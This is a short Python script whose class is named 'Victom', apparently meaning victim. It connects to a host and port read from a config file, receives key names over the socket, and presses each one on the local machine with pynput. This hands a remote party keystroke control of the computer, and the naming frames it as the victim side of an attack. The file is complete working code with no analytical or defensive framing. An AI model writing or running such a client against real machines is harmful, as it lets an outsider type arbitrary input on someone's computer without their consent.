import json
import socket
from pathlib import Path
from pynput import mouse, keyboard
from pynput.keyboard import Key, Controller
import time


class Victom:
    def __init__(self):

        self.keyboard = Controller()
        self.Client: socket.socket = None

        config_path = Path(__file__).with_name('config.json')
        with config_path.open('r', encoding='utf-8') as f:
            config = json.load(f)

        HOST = config['HOST']
        PORT = config['PORT']

        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as self.Client:
            self.Client.connect((HOST, PORT))

            while True:
                try:
                    data_size = self.recv_exact(1)
                    file_size = int.from_bytes(data_size, "big")
                    KeyPress = self.recv_exact(file_size).decode()
                except ConnectionError:
                    break

                if KeyPress.startswith("Key."):
                    key_name = KeyPress[4:]
                    key = getattr(keyboard.Key, key_name)
                else:
                    key = KeyPress
                
                print(key)
                self.keyboard.press(key)
                time.sleep(0.03)
                self.keyboard.release(key)

    def recv_exact(self, size):
        data_record = b""
        data = data_record

        while len(data_record) < size:
            data = self.Client.recv(size - len(data_record))

            if not data:
                raise ConnectionError("Connection closed before receiving all data")

            data_record += data

        return data_record


if __name__ == "__main__":
    V = Victom()